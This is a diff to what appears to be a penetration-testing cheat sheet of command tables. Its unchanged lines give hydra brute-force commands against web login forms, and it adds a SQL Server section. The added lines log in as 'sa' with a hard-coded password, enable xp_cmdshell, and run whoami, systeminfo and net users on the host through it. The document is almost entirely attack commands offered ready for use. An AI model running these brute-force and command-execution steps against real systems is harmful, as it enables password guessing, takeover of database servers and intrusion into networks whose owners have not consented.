@@ -170,9 +170,13 @@
 |hydra 10.10.10.52 http-post-form -L /usr/share/wordlists/list "/endpoit/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s PORT -P /usr/share/wordlists/list|
 |hydra -l IRISnoir -P /usr/share/wordlists/rockyou.txt -e nsr -v -V http-post-form://testasp.vulnweb.com/"Login.asp?RetURL=%2FDefault%2Easp%3F:tfUName=^USER^&tfUPass=^PASS^:S=logout"|
 
-| Linxu and Microsoft RPC Enumeration  |
+| SQL Serer |
 | ------------- |
 |Invoke-SqlCommand -server  192.168.1.10   -username sa -password 123456qQ -database master -query "EXEC sp_configure 'show advanced options',1;reconfigure; exec sp_configure 'xp_cmdshell',1;reconfigure" #To enable XP_CMD|
+|Invoke-SqlCommand -server  192.168.1.10  -username sa -password 123456qQ -database master -query "EXEC sp_configure 'xp_cmdshell',1; reconfigure"|
+|Invoke-SqlCommand -server  192.168.1.10  -username sa -password 123456qQ -database master -query "exec xp_cmdshell 'whoami' "|
+|Invoke-SqlCommand -server  192.168.1.10  -username sa -password 123456qQ -database master -query "exec xp_cmdshell 'systeminfo' "|
+|Invoke-SqlCommand -server  192.168.1.10  -username sa -password 123456qQ -database master -query "exec xp_cmdshell 'net users' " |
 
 | Linxu and Microsoft RPC Enumeration  |
 | ------------- |
